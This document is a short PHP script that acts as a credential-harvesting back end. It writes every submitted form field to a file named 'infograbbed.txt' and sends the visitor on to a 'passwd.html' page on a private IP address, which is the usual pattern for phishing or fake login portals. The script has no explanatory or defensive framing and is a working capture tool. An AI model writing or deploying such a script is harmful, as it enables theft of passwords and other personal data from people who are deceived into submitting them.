<?php
header('Location:http://10.1.1.1/passwd.html');

$handle = fopen("infograbbed.txt", "a");
$counter = 0;

foreach($_POST as $variable => $value) {
   if ($variable == "submit") {
      continue;
   }
   fwrite($handle, $variable);
   fwrite($handle, ": ");
   fwrite($handle, $value); 
   $counter++; 
}

fwrite($handle, "\n");
fclose($handle);
exit;
?>

